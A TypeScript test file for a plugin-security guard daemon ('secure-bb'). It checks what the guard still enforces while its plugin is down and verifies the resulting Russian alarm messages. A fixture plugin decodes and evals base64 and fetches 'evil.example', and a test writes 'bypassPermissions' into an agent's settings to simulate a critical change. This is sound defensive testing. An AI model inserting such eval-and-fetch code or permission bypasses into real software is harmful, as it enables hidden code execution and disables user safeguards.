// What a stopped secure-bb PLUGIN leaves open when the guard daemon is running. The alarm text is built from PLUGIN_DOWN_EFFECTS (src/ux.ts);
// here the first five flags are measured against a real guard that no plugin stands in front of, so the text cannot stay as it is when the behaviour changes.
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { PLUGIN_DOWN_EFFECTS, gapAlarmText, gapCauseText, unackedGaps, type GapContext, type GapLike, type PluginDownEffects } from "../../src/ux.ts";
import { Alive, SERVER_START_SLACK_MS, gapCause, GAP_THRESHOLD_MS } from "../../src/alive.ts";
import { coreHash, startGuard, type TestGuard } from "./support.ts";
import Database from "better-sqlite3";
import { MIGRATIONS, Store } from "../../src/store.ts";

const cleanup: Array<() => void | Promise<void>> = [];
afterEach(async () => {
  for (const f of cleanup.splice(0).reverse()) await f();
});
const tmp = (p: string): string => {
  const d = realpathSync(mkdtempSync(join(tmpdir(), p)));
  cleanup.push(() => rmSync(d, { recursive: true, force: true }));
  return d;
};
function plugin(dir: string, name: string, server: string): string {
  const d = join(dir, name);
  mkdirSync(d, { recursive: true });
  writeFileSync(join(d, "package.json"), JSON.stringify({ name, version: "1.0.0", bb: { name, server: "./server.ts" } }));
  writeFileSync(join(d, "server.ts"), server);
  return d;
}
const decideOf = (rootDir: string, pluginId: string, over: Record<string, unknown> = {}) => ({ op: "decide", pluginId, version: "1.0.0", contentHash: coreHash(rootDir), rootDir, source: `path:${rootDir}`, sourceKind: "path", provenance: "direct", trigger: "install", ...over });
const QUIET = `export default function plugin(bb) {\n  bb.log.info("hello");\n}\n`;
// What the plugin's own hook would stop at once: decode → eval, and a network call (a new capability).
const LOUD = `export default function plugin(bb) {\n  eval(atob("YWxlcnQoMSk="));\n  fetch("https://evil.example/x");\n}\n`;

/** What the code does with no plugin in front of the guard, found out by doing it. */
async function measure(): Promise<PluginDownEffects> {
  const home = tmp("sbb-pd-home-");
  const plugins = tmp("sbb-pd-plugins-");
  const settings = join(home, ".claude", "settings.json");
  mkdirSync(join(home, ".claude"), { recursive: true });
  writeFileSync(settings, '{"theme":"dark"}\n');
  const g: TestGuard = await startGuard({ agents: { home, extraRoots: [] }, trust: {} });
  cleanup.push(() => g.close());
  const scan = (): void => void g.guard.agentsScan({ force: true });
  scan();
  for (const d of (g.guard.agentsState() as any).drifts) g.guard.agentsAccept({ ids: [d.id], code: g.nextCode() });

  // unknown → held; approved by a human → loads again
  const known = plugin(plugins, "known", QUIET);
  const first = await g.send(decideOf(known, "known"));
  const guardHoldsUnknown = first.action === "wait";
  await g.send({ op: "approve", requestId: first.requestId, code: g.nextCode() });
  const guardApprovedStillRun = (await g.send(decideOf(known, "known"))).action === "proceed";

  // a window: a version full of what the hook would reject passes by the window alone
  g.guard.openWindow({ pluginId: "windowed", minutes: 30, code: g.nextCode() });
  const loud = plugin(plugins, "windowed", LOUD);
  const viaWindow = await g.send(decideOf(loud, "windowed"));
  const windowPassesUnchecked = viaWindow.action === "proceed" && viaWindow.via === "window";
  // …and the guard expires the window by itself
  g.guard.openWindow({ pluginId: "short", minutes: 5, code: g.nextCode() });
  g.clock.advance(6 * 60_000);
  g.guard.sweep();
  const guardExpiresWindows = ((await g.send({ op: "state" })).windows as Array<{ pluginId: string }>).every((w) => w.pluginId !== "short");

  // the agents' files: the guard reads them by itself and closes the windows on a critical change
  g.guard.openWindow({ pluginId: "before", minutes: 30, code: g.nextCode() });
  writeFileSync(settings, '{"theme":"dark","permissions":{"defaultMode":"bypassPermissions"}}\n');
  scan();
  const st = await g.send({ op: "state" });
  const seen = (g.guard.agentsState() as any).drifts[0]?.class === "critical";
  const guardWatchesAgents = seen && st.windows.length === 0 && st.closedWindows.some((w: any) => w.closedReason === "agents-critical");
  return { guardHoldsUnknown, guardApprovedStillRun, guardWatchesAgents, guardExpiresWindows, windowPassesUnchecked, pageAndConfigWatchAreThePlugins: true };
}

const ctx = (over: Partial<GapContext> = {}): GapContext => ({ guardModeNow: true, coreHoldsNow: false, configWatch: true, ...over });
const gap = (over: Partial<GapLike> = {}): GapLike => ({ from: 1, to: 13 * 60_000 + 1, ms: 13 * 60_000, mode: "guard", cause: "unknown", windowPasses: 0, ...over });

describe("the alarm about a stopped plugin tells the truth about its mode", () => {
  it("every effect the guard-mode text relies on is what a real guard does", async () => {
    expect(await measure()).toEqual(PLUGIN_DOWN_EFFECTS);
  });

  it("guard mode, the config watch is on: names what was open, says what worked, and does not say «выключили»", () => {
    const t = gapAlarmText(gap(), ctx());
    expect(t.severity).toBe("critical");
    expect(t.headline).toBe("Страница защиты не работала 13 мин");
    expect(t.works).toBe("Сторож в это время работал: версии плагинов удерживались и проверялись сторожем, одобренные версии работали, настройки агентов отслеживались.");
    expect(t.notWorking).toMatch(/страница, коды и касания/);
    expect(t.notWorking).toMatch(/наблюдение за настройками bb/);
    expect(t.notWorking).not.toMatch(/по окну доверия/);
    expect(t.opens).toHaveLength(1);
    expect(`${t.headline} ${t.works} ${t.notWorking}`).not.toMatch(/выключ|остановил|ничего не удерживалось/);
  });

  it("guard mode, nothing opened (no config snapshot, no version let in by a window): a calm line", () => {
    const t = gapAlarmText(gap(), ctx({ configWatch: false }));
    expect(t.severity).toBe("calm");
    expect(t.opens).toEqual([]);
    expect(t.works).toMatch(/Сторож в это время работал/);
    expect(t.notWorking).toMatch(/страница, коды и касания/);
  });

  it("guard mode: versions that passed by a window are named, and an unknown count keeps the alarm", () => {
    const some = gapAlarmText(gap({ windowPasses: 2 }), ctx({ configWatch: false }));
    expect(some.severity).toBe("critical");
    expect(some.notWorking).toMatch(/2 версии прошли по окну доверия без проверок плагина/);
    const unknown = gapAlarmText(gap({ windowPasses: null }), ctx({ configWatch: false }));
    expect(unknown.severity).toBe("critical");
    expect(unknown.notWorking).toMatch(/сколько их было, узнать не удалось/);
  });

  it("if the guard ever stopped checking, the text could not claim it did (effects drive the words)", () => {
    const t = gapAlarmText(gap(), ctx(), { ...PLUGIN_DOWN_EFFECTS, guardHoldsUnknown: false, guardWatchesAgents: false });
    expect(t.works).not.toMatch(/удерживались/);
    expect(t.works).not.toMatch(/агентов/);
    const noWindow = gapAlarmText(gap({ windowPasses: 5 }), ctx({ configWatch: false }), { ...PLUGIN_DOWN_EFFECTS, windowPassesUnchecked: false });
    expect(noWindow.severity).toBe("calm");
  });

  it("without a guard: honest «ничего не удерживается», or what the core did when it waits for the gate", () => {
    const free = gapAlarmText(gap({ mode: "hook", coreHolds: false }), ctx({ guardModeNow: false }));
    expect(free.severity).toBe("critical");
    expect(free.headline).toBe("Гейт не работал 13 мин");
    expect(free.notWorking).toMatch(/ничего не удерживается и не проверяется/);
    expect(free.works).toBe("");
    const holds = gapAlarmText(gap({ mode: "hook", coreHolds: true }), ctx({ guardModeNow: false }));
    expect(holds.notWorking).toMatch(/Ядро bb не загружало новые плагины/);
    expect(holds.notWorking).toMatch(/ничего не проверялось и не одобрялось/);
  });

  it("a record without a mode (written by an older version) is read in the mode the plugin runs in now", () => {
    const old = { from: 1, to: 2, ms: 13 * 60_000 } as GapLike;
    expect(gapAlarmText(old, ctx({ guardModeNow: true })).mode).toBe("guard");
    expect(gapAlarmText(old, ctx({ guardModeNow: false })).mode).toBe("hook");
  });

  it("the reason: disabled, error (with the core's text), server stopped; unknown says none of them", () => {
    expect(gapAlarmText(gap(), ctx({ reason: { kind: "disabled" } })).headline).toBe("Страница защиты не работала 13 мин (плагин был выключен)");
    expect(gapAlarmText(gap(), ctx({ reason: { kind: "error" } })).headline).toBe("Страница защиты не работала 13 мин (ошибка запуска плагина)");
    expect(gapAlarmText(gap(), ctx({ reason: { kind: "error", text: "migration failed" } })).headline).toMatch(/ошибка запуска плагина: migration failed/);
    expect(gapAlarmText(gap({ cause: "server" }), ctx()).headline).toBe("Страница защиты не работала 13 мин (сервер bb был остановлен)");
    expect(gapCauseText({ cause: "unknown" })).toBeNull();
    expect(gapAlarmText(gap({ mode: "hook", cause: "server" }), ctx({ guardModeNow: false })).headline).toBe("Гейт не работал 13 мин (сервер bb был остановлен)");
  });

  it("«Понятно» sets aside only what was recorded before it", () => {
    const gs = [{ at: 100 }, { at: 200 }];
    expect(unackedGaps(gs, null)).toHaveLength(2);
    expect(unackedGaps(gs, 150)).toEqual([{ at: 200 }]);
  });
});

describe("the gap record carries the facts of its mode", () => {
  function alive(extra: Partial<ConstructorParameters<typeof Alive>[0]> = {}) {
    const db = new Database(":memory:");
    for (const stmt of MIGRATIONS) db.exec(stmt);
    const clock = { t: 1_800_000_000_000 };
    const store = new Store(db, () => clock.t);
    const a = new Alive({ store, now: () => clock.t, safeMode: async () => false, ...extra });
    return { store, clock, a };
  }
  const gapOf = async (h: ReturnType<typeof alive>) => {
    await h.a.start();
    h.clock.t += GAP_THRESHOLD_MS + 13 * 60_000;
    return h.a.start();
  };

  it("guard mode: the mode, the server start and the versions let in by a window are recorded", async () => {
    let asked: [number, number] | null = null;
    const h = alive({ guardMode: true, coreHolds: true, windowPasses: async (f, t) => ((asked = [f, t]), 3) });
    const g = await gapOf(h);
    expect(g).toMatchObject({ mode: "guard", cause: "unknown", coreHolds: true, windowPasses: 3 });
    expect(asked).toEqual([g!.from, g!.to]);
    expect(h.a.view().gaps[0]).toMatchObject({ mode: "guard", windowPasses: 3 });
  });

  it("without a guard nobody is asked about windows", async () => {
    let asked = false;
    const h = alive({ windowPasses: async () => ((asked = true), 1) });
    expect(await gapOf(h)).toMatchObject({ mode: "hook", windowPasses: null });
    expect(asked).toBe(false);
  });

  it("a guard that cannot be asked leaves the count unknown, not zero", async () => {
    const h = alive({ guardMode: true, windowPasses: async () => { throw new Error("no socket"); } });
    expect((await gapOf(h))!.windowPasses).toBeNull();
  });

  it("the server stopped: it started after the last mark and the plugin came up with it; otherwise the cause is not claimed", () => {
    expect(gapCause(1000, 1000 + 13 * 60_000, 1000 + 13 * 60_000 - 5_000)).toBe("server");
    expect(gapCause(1000, 1000 + 13 * 60_000, 500)).toBe("unknown");
    expect(gapCause(1000, 1000 + 13 * 60_000, 1000 + 60_000)).toBe("unknown");
    expect(gapCause(1000, 1000 + 13 * 60_000, null)).toBe("unknown");
    expect(SERVER_START_SLACK_MS).toBeGreaterThan(0);
  });

  it("«Понятно» is remembered and is part of the view", async () => {
    const h = alive({ guardMode: true });
    await gapOf(h);
    expect(h.a.view().gapsAckedAt).toBeNull();
    h.clock.t += 1000;
    h.a.ackGaps();
    expect(h.a.view().gapsAckedAt).toBe(h.clock.t);
  });
});
